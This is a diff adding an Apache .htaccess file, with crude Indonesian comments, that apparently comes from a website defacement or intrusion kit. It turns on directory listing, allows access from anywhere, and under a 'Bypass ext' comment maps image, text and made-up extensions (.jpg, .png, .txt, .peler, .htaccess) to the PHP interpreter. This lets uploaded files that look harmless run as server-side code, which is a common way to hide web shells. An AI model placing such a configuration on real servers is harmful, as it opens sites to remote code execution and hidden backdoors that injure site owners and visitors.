@@ -1,0 +1,52 @@
+# Halaman rumah / teras
+DirectoryIndex lol.html
+# Biar bisa liat daleman, sempak, bra, dll
+Options +Indexes
+# Bikin daleman enak diliat, bh distro, sempak distro.
+IndexOptions +FancyIndexing
+# Allow sym
+# Options Indexes FollowSymLinks
+
+# Paksa masuk ke anu
+Order deny,allow
+Allow from all
+
+# Biar gk nikung, jadi cuma boleh aku yang bisa akses phpnya
+# <Files (file|class)\.php>
+# order allow,deny
+# deny from all
+# allow from 127.0.0.1
+# allow from 192.168.0.1
+# </Files>
+
+# Bypass ext
+AddHandler application/x-httpd-php .htm .html
+AddHandler txt .txt
+AddType txt .txt
+AddHandler application/x-httpd-php .peler
+AddType application/x-httpd-php .peler
+AddHandler application/x-httpd-php .sUx
+AddType application/x-httpd-php .sUx
+AddType application/x-httpd-php .htm .html
+# Code dari salah satu member sini, lupa usernya hehe
+AddType application/x-httpd-php .shor7cut
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .png
+AddType application/x-httpd-php .txt
+AddType application/x-httpd-php .jpeg
+AddType application/x-httpd-php .pjpeg
+AddType application/x-httpd-php .phtml
+AddType application/x-httpd-php .xxxjpg
+AddType application/x-httpd-php .php5
+AddType application/x-httpd-php-source .phps
+AddType application/x-httpd-php .htaccess
+
+# Buat ngintip daleman php
+# AddType txt .php
+# AddHandler txt .php
+
+# Ngintip daleman versi 2
+# AddHandler text/plain.php
+# AddType text/plain.php
+
+# AddType txt .php .phtml .pjpeg .htm .html .php5 .pHp .PHp .PHP
